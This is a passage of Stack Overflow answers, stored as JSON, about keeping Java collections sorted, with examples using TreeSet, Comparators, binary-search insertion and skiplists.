element at a time, the access times for insertions and removals are linear. Searches are logarithmic and index access constant (times can get different for LinkedList). The only code you need is 5, maybe 6 lines of bubble sort.</p>\n"},{"tags":[],"owner":{"account_id":2095459,"reputation":3057,"user_id":1864339,"display_name":"Carlos Verdes"},"down_vote_count":1,"up_vote_count":6,"is_accepted":false,"score":5,"last_activity_date":1354220425,"creation_date":1354218156,"answer_id":13633422,"question_id":416266,"body_markdown":"What I have done is implement List having a internal instance with all the methods delegated.\r\n\r\n\r\n     public class ContactList implements List&lt;Contact&gt;, Serializable {\r\n    \tprivate static final long serialVersionUID = -1862666454644475565L;\r\n    \tprivate final List&lt;Contact&gt; list;\r\n\r\n\tpublic ContactList() {\r\n\t\tsuper();\r\n\t\tthis.list = new ArrayList&lt;Contact&gt;();\r\n\t}\r\n\r\n\tpublic ContactList(List&lt;Contact&gt; list) {\r\n\t\tsuper();\r\n\t\t//copy and order list\r\n\t\tList&lt;Contact&gt;aux= new ArrayList(list);\r\n\t\tCollections.sort(aux);\r\n\t\t\r\n\t\tthis.list = aux;\r\n\t}\r\n\r\n\tpublic void clear() {\r\n\t\tlist.clear();\r\n\t}\r\n\r\n\tpublic boolean contains(Object object) {\r\n\t\treturn list.contains(object);\r\n\t}\r\n\r\n\r\n\r\nAfter, I have implemented a new method &quot;putOrdered&quot; which insert in the proper position if the element doesn&#39;t exist or replace just in case it exist.\r\n\r\n\r\n\tpublic void putOrdered(Contact contact) {\r\n\t\tint index=Collections.binarySearch(this.list,contact);\r\n\t\tif(index&lt;0){\r\n\t\t\tindex= -(index+1);\r\n\t\t\tlist.add(index, contact);\r\n\t\t}else{\r\n\t\t\tlist.set(index, contact);\r\n\t\t}\r\n\t}\r\n\r\nIf you want to allow repeated elements just implement addOrdered instead (or both).\r\n\r\n\tpublic void addOrdered(Contact contact) {\r\n\t\tint index=Collections.binarySearch(this.list,contact);\r\n\t\tif(index&lt;0){\r\n\t\t\tindex= -(index+1);\r\n\t\t}\r\n\t\tlist.add(index, contact);\r\n\t}\r\n\r\n\r\n\r\nIf you want to avoid inserts you can also throw and unsupported operation exception on  &quot;add&quot; and &quot;set&quot; methods. \r\n\r\n\tpublic boolean add(Contact object) {\r\n\t\tthrow new UnsupportedOperationException(&quot;Use putOrdered instead&quot;);\r\n\t}\r\n\r\n... and also You have to be careful with ListIterator methods because they could modify your internal list. In this case you can return a copy of the internal list or again throw an exception.\r\n\r\n\tpublic ListIterator&lt;Contact&gt; listIterator() {\r\n\t\treturn (new ArrayList&lt;Contact&gt;(list)).listIterator();\r\n\t}\r\n\r\n\r\n","title":"Sorted collection in Java","body":"<p>What I have done is implement List having a internal instance with all the methods delegated.</p>\n\n<pre><code> public class ContactList implements List&lt;Contact&gt;, Serializable {\n    private static final long serialVersionUID = -1862666454644475565L;\n    private final List&lt;Contact&gt; list;\n\npublic ContactList() {\n    super();\n    this.list = new ArrayList&lt;Contact&gt;();\n}\n\npublic ContactList(List&lt;Contact&gt; list) {\n    super();\n    //copy and order list\n    List&lt;Contact&gt;aux= new ArrayList(list);\n    Collections.sort(aux);\n\n    this.list = aux;\n}\n\npublic void clear() {\n    list.clear();\n}\n\npublic boolean contains(Object object) {\n    return list.contains(object);\n}\n</code></pre>\n\n<p>After, I have implemented a new method \"putOrdered\" which insert in the proper position if the element doesn't exist or replace just in case it exist.</p>\n\n<pre><code>public void putOrdered(Contact contact) {\n    int index=Collections.binarySearch(this.list,contact);\n    if(index&lt;0){\n        index= -(index+1);\n        list.add(index, contact);\n    }else{\n        list.set(index, contact);\n    }\n}\n</code></pre>\n\n<p>If you want to allow repeated elements just implement addOrdered instead (or both).</p>\n\n<pre><code>public void addOrdered(Contact contact) {\n    int index=Collections.binarySearch(this.list,contact);\n    if(index&lt;0){\n        index= -(index+1);\n    }\n    list.add(index, contact);\n}\n</code></pre>\n\n<p>If you want to avoid inserts you can also throw and unsupported operation exception on  \"add\" and \"set\" methods. </p>\n\n<pre><code>public boolean add(Contact object) {\n    throw new UnsupportedOperationException(\"Use putOrdered instead\");\n}\n</code></pre>\n\n<p>... and also You have to be careful with ListIterator methods because they could modify your internal list. In this case you can return a copy of the internal list or again throw an exception.</p>\n\n<pre><code>public ListIterator&lt;Contact&gt; listIterator() {\n    return (new ArrayList&lt;Contact&gt;(list)).listIterator();\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":365271,"reputation":30295,"user_id":710099,"accept_rate":79,"display_name":"Federico Piazza"},"down_vote_count":0,"up_vote_count":4,"is_accepted":false,"score":4,"last_activity_date":1434810502,"creation_date":1394646382,"answer_id":22359719,"question_id":416266,"body_markdown":"Using LambdaJ\r\n-\r\n\r\nYou can try solving these tasks with **LambdaJ** if you are using prior versions to java 8. You can find it here: [http://code.google.com/p/lambdaj/][1]\r\n\r\nHere you have an example:\r\n\r\n**Sort Iterative**\r\n\r\n    List&lt;Person&gt; sortedByAgePersons = new ArrayList&lt;Person&gt;(persons);\r\n    Collections.sort(sortedByAgePersons, new Comparator&lt;Person&gt;() {\r\n            public int compare(Person p1, Person p2) {\r\n               return Integer.valueOf(p1.getAge()).compareTo(p2.getAge());\r\n            }\r\n    }); \r\n\r\n**Sort with LambdaJ**\r\n\r\n    List&lt;Person&gt; sortedByAgePersons = sort(persons, on(Person.class).getAge()); \r\n\r\nOf course, having this kind of beauty impacts in the performance (an average of 2 times), but can you find a more readable code?\r\n\r\nSort with java 8 using lambda expression\r\n-\r\n\r\n    Collections.sort(persons, (p1, p2) -&gt; p1.getAge().compareTo(p2.getAge()));\r\n    //or\r\n    persons.sort((p1, p2) -&gt; p1.getAge().compareTo(p2.getAge()));\r\n\r\n\r\n  [1]: http://code.google.com/p/lambdaj/","title":"Sorted collection in Java","body":"<h2>Using LambdaJ</h2>\n\n<p>You can try solving these tasks with <strong>LambdaJ</strong> if you are using prior versions to java 8. You can find it here: <a href=\"http://code.google.com/p/lambdaj/\" rel=\"nofollow\">http://code.google.com/p/lambdaj/</a></p>\n\n<p>Here you have an example:</p>\n\n<p><strong>Sort Iterative</strong></p>\n\n<pre><code>List&lt;Person&gt; sortedByAgePersons = new ArrayList&lt;Person&gt;(persons);\nCollections.sort(sortedByAgePersons, new Comparator&lt;Person&gt;() {\n        public int compare(Person p1, Person p2) {\n           return Integer.valueOf(p1.getAge()).compareTo(p2.getAge());\n        }\n}); \n</code></pre>\n\n<p><strong>Sort with LambdaJ</strong></p>\n\n<pre><code>List&lt;Person&gt; sortedByAgePersons = sort(persons, on(Person.class).getAge()); \n</code></pre>\n\n<p>Of course, having this kind of beauty impacts in the performance (an average of 2 times), but can you find a more readable code?</p>\n\n<h2>Sort with java 8 using lambda expression</h2>\n\n<pre><code>Collections.sort(persons, (p1, p2) -&gt; p1.getAge().compareTo(p2.getAge()));\n//or\npersons.sort((p1, p2) -&gt; p1.getAge().compareTo(p2.getAge()));\n</code></pre>\n"},{"tags":[],"owner":{"account_id":407719,"reputation":3158,"user_id":777961,"accept_rate":51,"display_name":"Martin Klosi"},"down_vote_count":0,"up_vote_count":2,"is_accepted":false,"score":2,"last_activity_date":1414801283,"creation_date":1414801283,"answer_id":26685127,"question_id":416266,"body_markdown":"The problem with PriorityQueue is that it&#39;s backed up by an simple array, and the logic that gets the elements in order is done by the &quot;queue[2*n+1] and queue[2*(n+1)]&quot; thingie. It works great if you just pull from head, but makes it useless if you are trying to call the .toArray on it at some point. \r\n\r\nI go around this problem by using com.google.common.collect.TreeMultimap, but I supply a custom Comparator for the values, wrapped in an Ordering, that never returns 0. \r\n\r\nex. for Double:\r\n\r\n    private static final Ordering&lt;Double&gt; NoEqualOrder = Ordering.from(new Comparator&lt;Double&gt;() {\r\n\r\n        @Override\r\n        public int compare(Double d1, Double d2)\r\n        {\r\n            if (d1 &lt; d2) {\r\n                return -1;\r\n            }\r\n            else {\r\n                return 1;\r\n            }\r\n        }\r\n    });\r\n\r\nThis way I get the values in order when I call .toArray(), and also have duplicates.\r\n\r\n","title":"Sorted collection in Java","body":"<p>The problem with PriorityQueue is that it's backed up by an simple array, and the logic that gets the elements in order is done by the \"queue[2*n+1] and queue[2*(n+1)]\" thingie. It works great if you just pull from head, but makes it useless if you are trying to call the .toArray on it at some point. </p>\n\n<p>I go around this problem by using com.google.common.collect.TreeMultimap, but I supply a custom Comparator for the values, wrapped in an Ordering, that never returns 0. </p>\n\n<p>ex. for Double:</p>\n\n<pre><code>private static final Ordering&lt;Double&gt; NoEqualOrder = Ordering.from(new Comparator&lt;Double&gt;() {\n\n    @Override\n    public int compare(Double d1, Double d2)\n    {\n        if (d1 &lt; d2) {\n            return -1;\n        }\n        else {\n            return 1;\n        }\n    }\n});\n</code></pre>\n\n<p>This way I get the values in order when I call .toArray(), and also have duplicates.</p>\n"},{"tags":[],"owner":{"display_name":"user5497526"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1446026171,"creation_date":1446026171,"answer_id":33387877,"question_id":416266,"body_markdown":"You can use Arraylist and Treemap, as you said you want repeated values as well then you cant use TreeSet, though it is sorted as well, but you have to define comparator. ","title":"Sorted collection in Java","body":"<p>You can use Arraylist and Treemap, as you said you want repeated values as well then you cant use TreeSet, though it is sorted as well, but you have to define comparator. </p>\n"},{"tags":[],"owner":{"account_id":8383988,"reputation":23,"user_id":6294963,"display_name":"Shashank Mungantiwar"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1480492713,"creation_date":1480492368,"answer_id":40882970,"question_id":416266,"body_markdown":"Use sort() method to sort the list as below:\r\n\r\n    List list = new ArrayList();\r\n    \r\n    //add elements to the list\r\n    \r\n    Comparator comparator = new SomeComparator();\r\n    \r\n    Collections.sort(list, comparator);\r\n\r\nFor reference see the link:\r\nhttp://tutorials.jenkov.com/java-collections/sorting.html\r\n\r\n\r\n","title":"Sorted collection in Java","body":"<p>Use sort() method to sort the list as below:</p>\n\n<pre><code>List list = new ArrayList();\n\n//add elements to the list\n\nComparator comparator = new SomeComparator();\n\nCollections.sort(list, comparator);\n</code></pre>\n\n<p>For reference see the link:\n<a href=\"http://tutorials.jenkov.com/java-collections/sorting.html\" rel=\"nofollow noreferrer\">http://tutorials.jenkov.com/java-collections/sorting.html</a></p>\n"},{"tags":[],"owner":{"account_id":1836585,"reputation":578,"user_id":1666844,"display_name":"vladich"},"down_vote_count":0,"up_vote_count":6,"is_accepted":false,"score":6,"last_activity_date":1538013701,"creation_date":1482963526,"answer_id":41370488,"question_id":416266,"body_markdown":"The most efficient way to implement a sorted list like you want would be to implement an indexable skiplist as in here: [Wikipedia: Indexable skiplist][1]. \r\nIt would allow to have inserts/removals in O(log(n)) and would allow to have indexed access at the same time. And it would also allow duplicates.\r\n\r\nSkiplist is a pretty interesting and, I would say, underrated data structure.\r\nUnfortunately there is no indexed skiplist implementation in Java base library, but you can use one of open source implementations or implement it yourself. There are regular Skiplist implementations like [ConcurrentSkipListSet][2] and [ConcurrentSkipListMap][3]\r\n\r\n\r\n  [1]: https://en.wikipedia.org/wiki/Skip_list#Indexable_skiplist\r\n  [2]: https://docs.oracle.com/javase/7/docs/api/java/util/concurrent/ConcurrentSkipListSet.html\r\n  [3]: https://docs.oracle.com/javase/7/docs/api/java/util/concurrent/ConcurrentSkipListMap.html","title":"Sorted collection in Java","body":"<p>The most efficient way to implement a sorted list like you want would be to implement an indexable skiplist as in here: <a href=\"https://en.wikipedia.org/wiki/Skip_list#Indexable_skiplist\" rel=\"nofollow noreferrer\">Wikipedia: Indexable skiplist</a>. \nIt would allow to have inserts/removals in O(log(n)) and would allow to have indexed access at the same time. And it would also allow duplicates.</p>\n\n<p>Skiplist is a pretty interesting and, I would say, underrated data structure.\nUnfortunately there is no indexed skiplist implementation in Java base library, but you can use one of open source implementations or implement it yourself. There are regular Skiplist implementations like <a href=\"https://docs.oracle.com/javase/7/docs/api/java/util/concurrent/ConcurrentSkipListSet.html\" rel=\"nofollow noreferrer\">ConcurrentSkipListSet</a> and <a href=\"https://docs.oracle.com/javase/7/docs/api/java/util/concurrent/ConcurrentSkipListMap.html\" rel=\"nofollow noreferrer\">ConcurrentSkipListMap</a></p>\n"},{"tags":[],"owner":{"account_id":10071424,"reputation":1,"user_id":7444855,"display_name":"Hari"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1484899818,"creation_date":1484895588,"answer_id":41757813,"question_id":416266,"body_markdown":"Use `TreeSet` which gives elements in sorted order. OR use `Collection.sort()` for external sorting with `Comparator()`.","title":"Sorted collection in Java","body":"<p>Use <code>TreeSet</code> which gives elements in sorted order. OR use <code>Collection.sort()</code> for external sorting with <code>Comparator()</code>.</p>\n"},{"tags":[],"owner":{"account_id":11578123,"reputation":1,"user_id":8482842,"display_name":"Deepica M Y"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1503049379,"creation_date":1503048261,"answer_id":45753119,"question_id":416266,"body_markdown":"    import java.util.TreeSet;\r\n\r\n    public class Ass3 {\r\n    \tTreeSet&lt;String&gt;str=new TreeSet&lt;String&gt;();\r\n    \tstr.add(&quot;dog&quot;);\r\n    \tstr.add(&quot;doonkey&quot;);\r\n    \tstr.add(&quot;rat&quot;);\r\n    \tstr.add(&quot;rabbit&quot;);\r\n    \tstr.add(&quot;elephant&quot;);\r\n    \tSystem.out.println(str);\t\r\n    }\r\n\r\n","title":"Sorted collection in Java","body":"<pre><code>import java.util.TreeSet;\n\npublic class Ass3 {\n    TreeSet&lt;String&gt;str=new TreeSet&lt;String&gt;();\n    str.add(\"dog\");\n    str.add(\"doonkey\");\n    str.add(\"rat\");\n    str.add(\"rabbit\");\n    str.add(\"elephant\");\n    System.out.println(str);    \n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":1079267,"reputation":776,"user_id":1076703,"display_name":"Vipul Gulhane"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1534223160,"creation_date":1534223160,"answer_id":51834052,"question_id":416266,"body_markdown":"with Java 8 Comparator, if we want to sort list then  Here are the 10 most populated cities in the world and we want to sort it by name, as reported by Time. \r\n     Osaka, Japan. ... Mexico City, Mexico. ...\r\n\t   Beijing, China. ... S&#227;o Paulo, Brazil. ... Mumbai, India. ... Shanghai,\r\n\t   China. ... Delhi, India. ... Tokyo, Japan.\r\n\t  \r\n  \r\n\r\n     import java.util.Arrays;\r\n     import java.util.Comparator;\r\n     import java.util.List;\r\n    \r\n    public class SortCityList {\r\n    \r\n    \t/*\r\n    \t * Here are the 10 most populated cities in the world and we want to sort it by\r\n    \t * name, as reported by Time. Osaka, Japan. ... Mexico City, Mexico. ...\r\n    \t * Beijing, China. ... S&#227;o Paulo, Brazil. ... Mumbai, India. ... Shanghai,\r\n    \t * China. ... Delhi, India. ... Tokyo, Japan.\r\n    \t */\r\n    \tpublic static void main(String[] args) {\r\n    \t\tList&lt;String&gt; cities = Arrays.asList(&quot;Osaka&quot;, &quot;Mexico City&quot;, &quot;S&#227;o Paulo&quot;, &quot;Mumbai&quot;, &quot;Shanghai&quot;, &quot;Delhi&quot;,\r\n    \t\t\t\t&quot;Tokyo&quot;);\r\n    \t\tSystem.out.println(&quot;Before Sorting List is:-&quot;);\r\n    \t\tSystem.out.println(cities);\r\n    \t\tSystem.out.println(&quot;--------------------------------&quot;);\r\n    \r\n    \t\tSystem.out.println(&quot;After Use of List sort(String.CASE_INSENSITIVE_ORDER) &amp; Sorting List is:-&quot;);\r\n    \t\tcities.sort(String.CASE_INSENSITIVE_ORDER);\r\n    \t\tSystem.out.println(cities);\r\n    \t\tSystem.out.println(&quot;--------------------------------&quot;);\r\n    \t\tSystem.out.println(&quot;After Use of List sort(Comparator.naturalOrder()) &amp; Sorting List is:-&quot;);\r\n    \t\tcities.sort(Comparator.naturalOrder());\r\n    \t\tSystem.out.println(cities);\r\n    \r\n    \t}\r\n    \r\n    }\r\n\r\n","title":"Sorted collection in Java","body":"<p>with Java 8 Comparator, if we want to sort list then  Here are the 10 most populated cities in the world and we want to sort it by name, as reported by Time. \n     Osaka, Japan. ... Mexico City, Mexico. ...\n       Beijing, China. ... São Paulo, Brazil. ... Mumbai, India. ... Shanghai,\n       China. ... Delhi, India. ... Tokyo, Japan.</p>\n\n<pre><code> import java.util.Arrays;\n import java.util.Comparator;\n import java.util.List;\n\npublic class SortCityList {\n\n    /*\n     * Here are the 10 most populated cities in the world and we want to sort it by\n     * name, as reported by Time. Osaka, Japan. ... Mexico City, Mexico. ...\n     * Beijing, China. ... São Paulo, Brazil. ... Mumbai, India. ... Shanghai,\n     * China. ... Delhi, India. ... Tokyo, Japan.\n     */\n    public static void main(String[] args) {\n        List&lt;String&gt; cities = Arrays.asList(\"Osaka\", \"Mexico City\", \"São Paulo\", \"Mumbai\", \"Shanghai\", \"Delhi\",\n                \"Tokyo\");\n        System.out.println(\"Before Sorting List is:-\");\n        System.out.println(cities);\n        System.out.println(\"--------------------------------\");\n\n        System.out.println(\"After Use of List sort(String.CASE_INSENSITIVE_ORDER) &amp; Sorting List is:-\");\n        cities.sort(String.CASE_INSENSITIVE_ORDER);\n        System.out.println(cities);\n        System.out.println(\"--------------------------------\");\n        System.out.println(\"After Use of List sort(Comparator.naturalOrder()) &amp; Sorting List is:-\");\n        cities.sort(Comparator.naturalOrder());\n        System.out.println(cities);\n\n    }\n\n}\n</code></pre>\n"},{"tags":[],"owner":{"account_id":362217,"reputation":360,"user_id":705293,"display_name":"skpaik"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1538995101,"creation_date":1538995101,"answer_id":52700466,"question_id":416266,"body_markdown":"**Sorting an ArrayList according to user defined criteria.**\r\n\r\nModel Class\r\n\r\n     class Student \r\n     { \r\n         int rollno; \r\n         String name, address; \r\n  \r\n         public Student(int rollno, String name, String address) \r\n         { \r\n             this.rollno = rollno; \r\n             this.name = name; \r\n             this.address = address; \r\n         }   \r\n         \r\n         public String toString() \r\n         { \r\n             return this.rollno + &quot; &quot; + this.name + &quot; &quot; + this.address; \r\n         } \r\n     } \r\n\r\nSorting Class\r\n\r\n     class Sortbyroll implements Comparator&lt;Student&gt; \r\n     {         \r\n         public int compare(Student a, Student b) \r\n         { \r\n             return a.rollno - b.rollno; \r\n         } \r\n     } \r\n\r\nMain Class\r\n\r\n     class Main \r\n     { \r\n         public static void main (String[] args) \r\n         { \r\n             ArrayList&lt;Student&gt; ar = new ArrayList&lt;Student&gt;(); \r\n             ar.add(new Student(111, &quot;bbbb&quot;, &quot;london&quot;)); \r\n             ar.add(new Student(131, &quot;aaaa&quot;, &quot;nyc&quot;)); \r\n             ar.add(new Student(121, &quot;cccc&quot;, &quot;jaipur&quot;)); \r\n  \r\n             System.out.println(&quot;Unsorted&quot;); \r\n             for (int i=0; i&lt;ar.size(); i++) \r\n                 System.out.println(ar.get(i)); \r\n  \r\n             Collections.sort(ar, new Sortbyroll()); \r\n  \r\n             System.out.println(&quot;\\nSorted by rollno&quot;); \r\n             for (int i=0; i&lt;ar.size(); i++) \r\n                 System.out.println(ar.get(i)); \r\n         } \r\n     } \r\n\r\n\r\n\r\nOutput\r\n\r\n     Unsorted\r\n     111 bbbb london\r\n     131 aaaa nyc\r\n     121 cccc jaipur\r\n\r\n     Sorted by rollno\r\n     111 bbbb london\r\n     121 cccc jaipur\r\n     131 aaaa nyc","title":"Sorted collection in Java","body":"<p><strong>Sorting an ArrayList according to user defined criteria.</strong></p>\n\n<p>Model Class</p>\n\n<pre><code> class Student \n { \n     int rollno; \n     String name, address; \n\n     public Student(int rollno, String name, String address) \n     { \n         this.rollno = rollno; \n         this.name = name; \n         this.address = address; \n     }   \n\n     public String toString() \n     { \n         return this.rollno + \" \" + this.name + \" \" + this.address; \n     } \n } \n</code></pre>\n\n<p>Sorting Class</p>\n\n<pre><code> class Sortbyroll implements Comparator&lt;Student&gt; \n {         \n     public int compare(Student a, Student b) \n     { \n         return a.rollno - b.rollno; \n     } \n } \n</code></pre>\n\n<p>Main Class</p>\n\n<pre><code> class Main \n { \n     public static void main (String[] args) \n     { \n         ArrayList&lt;Student&gt; ar = new ArrayList&lt;Student&gt;(); \n         ar.add(new Student(111, \"bbbb\", \"london\")); \n         ar.add(new Student(131, \"aaaa\", \"nyc\")); \n         ar.add(new Student(121, \"cccc\", \"jaipur\")); \n\n         System.out.println(\"Unsorted\"); \n         for (int i=0; i&lt;ar.size(); i++) \n             System.out.println(ar.get(i)); \n\n         Collections.sort(ar, new Sortbyroll()); \n\n         System.out.println(\"\\nSorted by rollno\"); \n         for (int i=0; i&lt;ar.size(); i++) \n             System.out.println(ar.get(i)); \n     } \n } \n</code></pre>\n\n<p>Output</p>\n\n<pre><code> Unsorted\n 111 bbbb london\n 131 aaaa nyc\n 121 cccc jaipur\n\n Sorted by rollno\n 111 bbbb london\n 121 cccc jaipur\n 131 aaaa nyc\n</code></pre>\n"},{"tags":[],"owner":{"account_id":9827031,"reputation":61,"user_id":7279963,"display_name":"Avi Tyagi"},"down_vote_count":0,"up_vote_count":3,"is_accepted":false,"score":3,"last_activity_date":1561453571,"creation_date":1561444589,"answer_id":56748112,"question_id":416266,"body_markdown":"For Set you can use TreeSet.  TreeSet orders it&#39;s elements on the basis of a natural ordering or any sorting order passed to the Comparable for that particular object.\r\nFor map use TreeMap. TreeMap provides the sorting over keys. To add an object as a key to the TreeMap that class should implement comparable interface which in turn forces to implement compare to() method which contains the definition of the sorting order.\r\n[http://techmastertutorial.in/java-collection-impl.html][1]\r\n\r\n\r\n  [1]: http://techmastertutorial.in/java-collection-impl.html","title":"Sorted collection in Java","body":"<p>For Set you can use TreeSet.  TreeSet orders it's elements on the basis of a natural ordering or any sorting order passed to the Comparable for that particular object.\nFor map use TreeMap. TreeMap provides the sorting over keys. To add an object as a key to the TreeMap that class should implement comparable interface which in turn forces to implement compare to() method which contains the definition of the sorting order.\n<a href=\"http://techmastertutorial.in/java-collection-impl.html\" rel=\"nofollow noreferrer\">http://techmastertutorial.in/java-collection-impl.html</a></p>\n"},{"tags":[],"owner":{"account_id":23972525,"reputation":11,"user_id":17961025,"display_name":"shiawasenahikari"},"down_vote_count":0,"up_vote_count":1,"is_accepted":false,"score":1,"last_activity_date":1642483902,"creation_date":1642483902,"answer_id":70750704,"question_id":416266,"body_markdown":"Why don&#39;t make it yourself?\r\n\r\n```Java\r\nimport java.util.ArrayList;\r\nimport java.util.Collection;\r\nimport java.util.Collections;\r\nimport java.util.Iterator;\r\nimport java.util.List;\r\nimport java.util.Random;\r\n\r\nclass SortedList&lt;E extends Comparable&lt;E&gt;&gt; extends ArrayList&lt;E&gt; {\r\n    @Override\r\n    public boolean add(E e) {\r\n        int i = Collections.binarySearch(this, e);\r\n\r\n        if (i &lt; 0) i = ~i;\r\n        super.add(i, e);\r\n        return true;\r\n    } // add(E e)\r\n\r\n    @Override\r\n    public void add(int index, E element) {\r\n        this.add(element);\r\n    } // add(int, E)\r\n\r\n    @Override\r\n    public boolean addAll(Collection&lt;? extends E&gt; c) {\r\n        int oldSize = this.size();\r\n\r\n        for (E element : c) this.add(element);\r\n        return oldSize != this.size();\r\n    } // addAll(Collection&lt;? extends E&gt;)\r\n\r\n    @Override\r\n    public boolean addAll(int index, Collection&lt;? extends E&gt; c) {\r\n        int oldSize = this.size();\r\n        Iterator&lt;? extends E&gt; it = c.iterator();\r\n\r\n        for (int i = 0; i &lt; index; ++i) it.next();\r\n        while (it.hasNext()) this.add(it.next());\r\n        return oldSize != this.size();\r\n    } // addAll(Collection&lt;? extends E&gt;)\r\n\r\n    @Override\r\n    public E set(int index, E element) {\r\n        E ret = this.get(index);\r\n\r\n        this.remove(index);\r\n        this.add(element);\r\n        return ret;\r\n    } // set(int, E)\r\n} // SortedList&lt;E&gt; Class\r\n\r\npublic class Solution {\r\n    public static void main(String[] args) {\r\n        Random r = new Random(1);\r\n        List&lt;Integer&gt; sortedList = new SortedList&lt;&gt;();\r\n        List&lt;Integer&gt; unsortedList = new ArrayList&lt;&gt;();\r\n\r\n        for (int i = 0; i &lt; 50; ++i) {\r\n            int next = r.nextInt(1000);\r\n\r\n            sortedList.add(next);\r\n            unsortedList.add(next);\r\n        } // for (int i = 0; i &lt; 50; ++i)\r\n\r\n        System.out.println(&quot;unsortedList:&quot;);\r\n        System.out.println(unsortedList);\r\n        System.out.println(&quot;\\nsortedList:&quot;);\r\n        System.out.println(sortedList);\r\n        sortedList.clear();\r\n        sortedList.addAll(unsortedList);\r\n        System.out.println(&quot;\\ntest for addAll(Collection) method:&quot;);\r\n        System.out.println(sortedList);\r\n        sortedList.clear();\r\n        sortedList.addAll(30, unsortedList);\r\n        System.out.println(&quot;\\ntest for addAll(int, Collection) method:&quot;);\r\n        System.out.println(sortedList);\r\n        sortedList.set(0, 999);\r\n        System.out.println(&quot;\\ntest for set(int, E) method:&quot;);\r\n        System.out.println(sortedList);\r\n    } // main(String[])\r\n} // Solution Class\r\n```\r\n\r\noutput:\r\n```\r\nunsortedList:\r\n[985, 588, 847, 313, 254, 904, 434, 606, 978, 748, 569, 473, 317, 263, 562, 234, 592, 262, 596, 189, 376, 332, 310, 99, 674, 959, 298, 153, 437, 302, 205, 854, 800, 6, 363, 955, 689, 820, 75, 834, 415, 660, 477, 737, 477, 592, 220, 888, 500, 357]\r\n\r\nsortedList:\r\n[6, 75, 99, 153, 189, 205, 220, 234, 254, 262, 263, 298, 302, 310, 313, 317, 332, 357, 363, 376, 415, 434, 437, 473, 477, 477, 500, 562, 569, 588, 592, 592, 596, 606, 660, 674, 689, 737, 748, 800, 820, 834, 847, 854, 888, 904, 955, 959, 978, 985]\r\n\r\ntest for addAll(Collection) method:\r\n[6, 75, 99, 153, 189, 205, 220, 234, 254, 262, 263, 298, 302, 310, 313, 317, 332, 357, 363, 376, 415, 434, 437, 473, 477, 477, 500, 562, 569, 588, 592, 592, 596, 606, 660, 674, 689, 737, 748, 800, 820, 834, 847, 854, 888, 904, 955, 959, 978, 985]\r\n\r\ntest for addAll(int, Collection) method:\r\n[6, 75, 205, 220, 357, 363, 415, 477, 477, 500, 592, 660, 689, 737, 800, 820, 834, 854, 888, 955]\r\n\r\ntest for set(int, E) method:\r\n[75, 205, 220, 357, 363, 415, 477, 477, 500, 592, 660, 689, 737, 800, 820, 834, 854, 888, 955, 999]\r\n```","title":"Sorted collection in Java","body":"<p>Why don't make it yourself?</p>\n<pre><code>import java.util.ArrayList;\nimport java.util.Collection;\nimport java.util.Collections;\nimport java.util.Iterator;\nimport java.util.List;\nimport java.util.Random;\n\nclass SortedList&lt;E extends Comparable&lt;E&gt;&gt; extends ArrayList&lt;E&gt; {\n    @Override\n    public boolean add(E e) {\n        int i = Collections.binarySearch(this, e);\n\n        if (i &lt; 0) i = ~i;\n        super.add(i, e);\n        return true;\n    } // add(E e)\n\n    @Override\n    public void add(int index, E element) {\n        this.add(element);\n    } // add(int, E)\n\n    @Override\n    public boolean addAll(Collection&lt;? extends E&gt; c) {\n        int oldSize = this.size();\n\n        for (E element : c) this.add(element);\n        return oldSize != this.size();\n    } // addAll(Collection&lt;? extends E&gt;)\n\n    @Override\n    public boolean addAll(int index, Collection&lt;? extends E&gt; c) {\n        int oldSize = this.size();\n        Iterator&lt;? extends E&gt; it = c.iterator();\n\n        for (int i = 0; i &lt; index; ++i) it.next();\n        while (it.hasNext()) this.add(it.next());\n        return oldSize != this.size();\n    } // addAll(Collection&lt;? extends E&gt;)\n\n    @Override\n    public E set(int index, E element) {\n        E ret = this.get(index);\n\n        this.remove(index);\n        this.add(element);\n        return ret;\n    } // set(int, E)\n} // SortedList&lt;E&gt; Class\n\npublic class Solution {\n    public static void main(String[] args) {\n        Random r = new Random(1);\n        List&lt;Integer&gt; sortedList = new SortedList&lt;&gt;();\n        List&lt;Integer&gt; unsortedList = new ArrayList&lt;&gt;();\n\n        for (int i = 0; i &lt; 50; ++i) {\n            int next = r.nextInt(1000);\n\n            sortedList.add(next);\n            unsortedList.add(next);\n        } // for (int i = 0; i &lt; 50; ++i)\n\n        System.out.println(&quot;unsortedList:&quot;);\n        System.out.println(unsortedList);\n        System.out.println(&quot;\\nsortedList:&quot;);\n        System.out.println(sortedList);\n        sortedList.clear();\n        sortedList.addAll(unsortedList);\n        System.out.println(&quot;\\ntest for addAll(Collection) method:&quot;);\n        System.out.println(sortedList);\n        sortedList.clear();\n        sortedList.addAll(30, unsortedList);\n        System.out.println(&quot;\\ntest for addAll(int, Collection) method:&quot;);\n        System.out.println(sortedList);\n        sortedList.set(0, 999);\n        System.out.println(&quot;\\ntest for set(int, E) method:&quot;);\n        System.out.println(sortedList);\n    } // main(String[])\n} // Solution Class\n</code></pre>\n<p>output:</p>\n<pre><code>unsortedList:\n[985, 588, 847, 313, 254, 904, 434, 606, 978, 748, 569, 473, 317, 263, 562, 234, 592, 262, 596, 189, 376, 332, 310, 99, 674, 959, 298, 153, 437, 302, 205, 854, 800, 6, 363, 955, 689, 820, 75, 834, 415, 660, 477, 737, 477, 592, 220, 888, 500, 357]\n\nsortedList:\n[6, 75, 99, 153, 189, 205, 220, 234, 254, 262, 263, 298, 302, 310, 313, 317, 332, 357, 363, 376, 415, 434, 437, 473, 477, 477, 500, 562, 569, 588, 592, 592, 596, 606, 660, 674, 689, 737, 748, 800, 820, 834, 847, 854, 888, 904, 955, 959, 978, 985]\n\ntest for addAll(Collection) method:\n[6, 75, 99, 153, 189, 205, 220, 234, 254, 262, 263, 298, 302, 310, 313, 317, 332, 357, 363, 376, 415, 434, 437, 473, 477, 477, 500, 562, 569, 588, 592, 592, 596, 606, 660, 674, 689, 737, 748, 800, 820, 834, 847, 854, 888, 904, 955, 959, 978, 985]\n\ntest for addAll(int, Collection) method:\n[6, 75, 